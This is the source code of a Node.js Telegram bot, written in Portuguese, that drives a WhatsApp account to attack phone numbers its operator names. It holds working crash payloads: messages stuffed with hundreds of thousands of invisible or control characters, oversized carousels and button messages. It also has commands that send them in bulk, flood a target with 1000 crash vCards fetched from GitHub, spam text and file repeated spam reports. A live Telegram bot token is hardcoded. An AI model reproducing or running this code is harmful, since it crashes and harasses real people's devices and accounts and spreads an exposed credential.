const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, downloadMediaMessage } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Servidor HTTP básico exigido pelo Render para manter o serviço ativo 24h
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ (LOTUX) Rodando 24 Horas!\n');
}).listen(PORT, () => {
    console.log(`Servidor HTTP rodando na porta ${PORT}`);
});

const TELEGRAM_TOKEN = '8622724732:AAFVKNCfcYIlZqfSGmnK23Urt1VAVy1kPHE';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

let waSock = null;
let jaNotificouConectado = false;
let reconectando = false;

const dadosUsuarios = {}; 
const configuracoesGrupos = {}; 
const sessoesBrincadeira = {}; 

const META_AI_JID = '718584497008509@s.whatsapp.net';

function consultarAPI(url) {
    return new Promise((resolve) => {
        const req = https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch (e) { resolve({ resultado: data }); }
            });
        });
        req.on('error', () => resolve({ erro: "Falha na conexão." }));
        req.setTimeout(8000, () => { req.destroy(); resolve({ erro: "Timeout." }); });
    });
}

function baixarVCFGitHub() {
    return new Promise((resolve) => {
        const urlRaw = 'https://raw.githubusercontent.com/wv0304362-bot/ZRX-BANCEK-/main/Trava.vcf';
        https.get(urlRaw, (res) => {
            let vcardData = '';
            res.on('data', chunk => vcardData += chunk);
            res.on('end', () => resolve(vcardData));
        }).on('error', () => resolve(null));
    });
}

// ==================== MÉTODOS DE TRAVAS E CRASH JSON (LOTUX) ====================

// 1. Crash Chat / BlokWidget (Payload com repeat pesado)
async function enviarTravaCrashChat(sock, jidAlvo) {
    const payloadJson = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        bloksWidget: {
                            data: "\u200d".repeat(60000),
                            fallback: "\u200d".repeat(60000)
                        },
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0,
                            name: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ",
                            address: "LOTUX SYSTEM"
                        }
                    },
                    body: { text: "⚡ [ZERYX-CRASH-CHAT] - LOTUX 💥" },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "⚡ Click to Crash Zeryx ⚡",
                                    copy_code: "\u0000".repeat(500000)
                                })
                            }
                        ],
                        messageVersion: 3
                    }
                }
            }
        }
    };
    await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
}

// 2. Crash iOS / Buttons Message
async function enviarTravaIOS(sock, jidAlvo) {
    const payloadJson = {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    locationMessage: {
                        degreesLatitude: 0,
                        degreesLongitude: 0,
                        name: "𑇂𑆵𑆴".repeat(3000)
                    },
                    buttons: [
                        {
                            buttonId: "lotux_uwu",
                            buttonText: { displayText: "𑇂𑆵𑆴".repeat(500) },
                            type: "RESPONSE"
                        }
                    ],
                    headerType: "LOCATION"
                }
            }
        }
    };
    await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
}

// 3. Crash UI / System UI (Baseado nos prints)
async function enviarTravaCrashUI(sock, jidAlvo) {
    const payloadJson = {
        interactiveMessage: {
            body: {
                text: "\u00a9".repeat(100000)
            },
            nativeFlowMessage: {
                messageParamsJson: ""
            },
            bloksWidget: {
                uuid: "",
                data: "",
                type: "",
                fallback: "</> Zeryx.js - LOTUX 🪐"
            },
            contextInfo: {
                nonJidMentions: 9999
            }
        }
    };
    await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
}

// 4. Lag Home / Delay Method
async function enviarTravaLagHome(sock, jidAlvo) {
    const payloadJson = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "⚡ LOTUX DELAY METHOD ⚡" },
                    footer: { text: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ" },
                    carouselMessage: {
                        cards: Array(100).fill({
                            header: {
                                title: "\nㅤㅤ\n",
                                hasMediaAttachment: false
                            },
                            body: { text: "LAG SYSTEM ACTIVE" },
                            nativeFlowMessage: {
                                buttons: [{ name: "cta_url", buttonParamsJson: "{\"display_text\":\"LOTUX\",\"url\":\"https://t.me\"}" }]
                            }
                        }),
                        messageVersion: 1
                    }
                }
            }
        }
    };
    await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
}

async function iniciarWhatsApp(chatId, numeroTelefone) {
    if (reconectando) return;
    reconectando = true;

    const pastaSessao = path.join(__dirname, 'sessao_teste');
    const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);

    waSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    waSock.ev.on('creds.update', saveCreds);

    waSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            jaNotificouConectado = false;
            setTimeout(() => { reconectando = false; iniciarWhatsApp(chatId, numeroTelefone); }, 5000);
        } else if (connection === 'open') {
            reconectando = false;
            if (chatId && !jaNotificouConectado) {
                jaNotificouConectado = true;
                bot.sendMessage(chatId, "✅ **Conectado com sucesso ao WhatsApp (LOTUX)!**", { parse_mode: 'Markdown' });
            }
        }
    });

    waSock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg.message) return;

            const remoteJid = msg.key.remoteJid;
            const texto = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '';

            if (!texto) return;
            console.log(`Mensagem recebida de ${remoteJid}:${texto}`);

            // MENU INTERATIVO AVANÇADO (ESTILO PAXLEY / ZERYX COM FOTO DO GITHUB)
            if (texto.trim() === '/menu') {
                const numeroUsuario = remoteJid.split('@')[0];
                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

                const menuInterativo = {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    hasMediaAttachment: true,
                                    imageMessage: {
                                        url: "https://raw.githubusercontent.com/wv0304362-bot/ZRX-BANCEK-/main/menu.jpg",
                                        mimetype: "image/jpeg",
                                        caption: "⚡ *Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ* ⚡\n> _O poder absoluto nas mãos de LOTUX._\n> 「 ⓘ. Zeryx - System 」"
                                    }
                                },
                                body: {
                                    text: `📱 *Usuário:* \`${numeroUsuario}\` (LOTUX)\n🕒 *Horário:* ${dataHoraAtual}\n⭐ *Status:* PREMIUM ADMIN`
                                },
                                footer: {
                                    text: "\n▢ ./Informação\n└──\n ├─ ▢ *Author*: *LOTUX*\n ├─ ▢ *Prefix*: *Multi*\n └─ *ZeryxSpam 🦠*\n"
                                },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "single_select",
                                            buttonParamsJson: JSON.stringify({
                                                icon: "DOCUMENT",
                                                title: "🚀 Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐌𝐄𝐍𝐔 (LOTUX) 🚀",
                                                sections: [
                                                    {
                                                        title: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ",
                                                        rows: [
                                                            { title: "⚡ /crasher <núm> <qtd>", id: "/crasher", description: "Crash Chat JSON" },
                                                            { title: "🍏 /ioscrash <núm> <qtd>", id: "/ioscrash", description: "Crash iOS / Buttons" },
                                                            { title: "💻 /crashui <núm> <qtd>", id: "/crashui", description: "Crash System UI" },
                                                            { title: "🌀 /laghome <núm> <qtd>", id: "/laghome", description: "Lag Home / Delay" },
                                                            { title: "📞 /5p4n <núm>", id: "/5p4n", description: "1000 Travas VCF do GitHub" },
                                                            { title: "💬 /SP4M <núm> <qtd>", id: "/SP4M", description: "Spam de Texto" },
                                                            { title: "🛡️ /B4N <núm> <qtd>", id: "/B4N", description: "Denúncias Nativas" },
                                                            { title: "🧹 /limpar", id: "/limpar", description: "Limpar Sessão do Bot" }
                                                        ]
                                                    }
                                                ]
                                            })
                                        },
                                        {
                                            name: "cta_url",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "🌐 Canal Oficial",
                                                url: "https://whatsapp.com/channel/0029VbCvKL1Id7nDv6KoDH0S",
                                                landing_page_url: "https://whatsapp.com/channel/0029VbCvKL1Id7nDv6KoDH0S"
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                };

                await waSock.sendMessage(remoteJid, menuInterativo);
            }
            // COMANDO /crasher
            else if (texto.startsWith('/crasher ')) {
                const partes = texto.replace('/crasher', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 5;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/crasher <número> <quantidade>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🚀 Disparando ${quantidade} travas Crash Chat para \`${alvoNum}\` (LOTUX)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await enviarTravaCrashChat(waSock, jidAlvo);
                        await delay(800);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash Chat concluído!` });
            }
            // COMANDO /ioscrash
            else if (texto.startsWith('/ioscrash ')) {
                const partes = texto.replace('/ioscrash', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 5;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/ioscrash <número> <quantidade>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🍏 Disparando travas Crash iOS para \`${alvoNum}\` (${quantidade}x)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await enviarTravaIOS(waSock, jidAlvo);
                        await delay(800);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash iOS concluído!` });
            }
            // COMANDO /crashui
            else if (texto.startsWith('/crashui ')) {
                const partes = texto.replace('/crashui', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 5;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/crashui <número> <quantidade>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `⚡ Disparando Crash System UI para \`${alvoNum}\` (${quantidade}x)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await enviarTravaCrashUI(waSock, jidAlvo);
                        await delay(800);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash UI concluído!` });
            }
            // COMANDO /laghome
            else if (texto.startsWith('/laghome ')) {
                const partes = texto.replace('/laghome', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 3;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/laghome <número> <quantidade>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🌀 Disparando Lag Home / Delay para \`${alvoNum}\` (${quantidade}x)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await enviarTravaLagHome(waSock, jidAlvo);
                        await delay(1000);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Lag Home concluído!` });
            }
            // COMANDO /5p4n (1000 VCF DO GITHUB)
            else if (texto.startsWith('/5p4n ')) {
                const alvoNum = texto.replace('/5p4n', '').trim().replace(/\D/g, '');
                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/5p4n <número>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🚀 Baixando arquivo VCF e enviando 1000 travas de contato para \`${alvoNum}\` (LOTUX)...` });

                const vcardConteudo = await baixarVCFGitHub();
                if (!vcardConteudo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao baixar a trava VCF do GitHub.' });
                    return;
                }

                for (let i = 1; i <= 1000; i++) {
                    try {
                        await waSock.sendMessage(jidAlvo, {
                            contacts: {
                                displayName: `LOTUX Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 ⚡ #${i}`,
                                contacts: [{ vcard: vcardConteudo }]
                            }
                        });
                        await delay(300);
                    } catch (e) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ 1000 Travas VCF enviadas com sucesso para \`${alvoNum}\`!` });
            }
            // COMANDO SP4M
            else if (texto.startsWith('/SP4M ')) {
                const partes = texto.replace('/SP4M', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/SP4M <número> <quantidade>`' });
                    return;
                }

                let conteudoTrava = "⚡ [Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ - LOTUX] Alvo sob ataque!";
                const caminhoPayload = path.join(__dirname, 'Trava.txt');
                if (fs.existsSync(caminhoPayload)) {
                    const lido = fs.readFileSync(caminhoPayload, 'utf-8').trim();
                    if (lido.length > 0) conteudoTrava = lido;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🚀 Iniciando SP4M para ${alvoNum} (${quantidade} ciclos)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[Ciclo ${i}/${quantidade}]` });
                        await delay(1000);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Disparo SP4M concluído!` });
            }
            // COMANDO B4N
            else if (texto.startsWith('/B4N ')) {
                const partes = texto.replace('/B4N', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4N <número> <quantidade>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas para \`${alvoNum}\` (${quantidade} ciclos)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await waSock.chatModify({
                            reportSpam: true,
                            delete: true,
                            spam: true
                        }, jidAlvo, { fromMe: false, remoteJid: jidAlvo });
                        await delay(700);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo /B4N concluído!` });
            }
        } catch (erroMensagem) {
            console.error("Erro no processamento:", erroMensagem);
        }
    });

    if (!state.creds.registered && numeroTelefone) {
        await delay(3000);
        try {
            const codigo = await waSock.requestPairingCode(numeroTelefone);
            if (chatId) {
                bot.sendMessage(chatId, `✅ **Código de Emparelhamento (LOTUX):**\n\`${codigo}\``, { parse_mode: 'Markdown' });
            }
        } catch (error) {}
    }
}

// COMANDOS DO TELEGRAM (INCLUINDO /limpar)
bot.onText(/\/limpar|\/desconectar/, async (msg) => {
    const chatId = msg.chat.id;
    const pastaSessao = path.join(__dirname, 'sessao_teste');

    try {
        if (waSock) {
            await waSock.logout().catch(() => {});
            waSock = null;
        }
        if (fs.existsSync(pastaSessao)) {
            fs.rmSync(pastaSessao, { recursive: true, force: true });
        }
        reconectando = false;
        jaNotificouConectado = false;
        bot.sendMessage(chatId, "🧹 **Sessão do WhatsApp limpa com sucesso!** Podes conectar novamente.", { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(chatId, "❌ Erro ao limpar a sessão.");
    }
});

bot.onText(/\/conectar (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const numeroTelefone = match[1].replace(/\D/g, '');
    bot.sendMessage(chatId, `🔄 Solicitando código para \`${numeroTelefone}\`...`, { parse_mode: 'Markdown' });
    await iniciarWhatsApp(chatId, numeroTelefone);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `🤖 *Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ SYSTEM* (LOTUX)\n\n• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n• Para limpar a sessão: \`/limpar\``, { parse_mode: 'Markdown' });
});

console.log("Bot Telegram iniciado com sucesso para o LOTUX!");
